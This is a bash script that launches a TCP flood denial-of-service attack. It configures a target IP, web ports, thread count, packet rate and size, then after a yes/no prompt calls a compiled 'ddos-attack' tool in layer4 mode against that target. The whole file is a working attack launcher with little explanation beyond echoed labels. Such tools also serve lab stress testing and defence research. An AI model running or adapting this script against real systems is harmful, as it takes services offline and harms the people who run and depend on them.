#!/bin/bash

# Basic TCP flood attack example
# This script demonstrates a simple TCP flood attack

echo "TCP Flood Attack Example"
echo "======================="

# Target configuration
TARGET_IP="192.168.1.100"
TARGET_PORTS="80,443,8080"
THREADS=50
RATE=500
PACKET_SIZE=1024

echo "Target: $TARGET_IP"
echo "Ports: $TARGET_PORTS"
echo "Threads: $THREADS"
echo "Rate: $RATE packets/sec"
echo "Packet Size: $PACKET_SIZE bytes"
echo ""

read -p "Continue with attack? (y/N): " -n 1 -r
echo
if [[ $REPLY =~ ^[Yy]$ ]]; then
    echo "Starting TCP flood attack..."
    
    ./target/release/ddos-attack layer4 \
        --targets "$TARGET_IP" \
        --ports "$TARGET_PORTS" \
        --protocol tcp \
        --threads $THREADS \
        --rate $RATE \
        --size $PACKET_SIZE
else
    echo "Attack cancelled."
fi
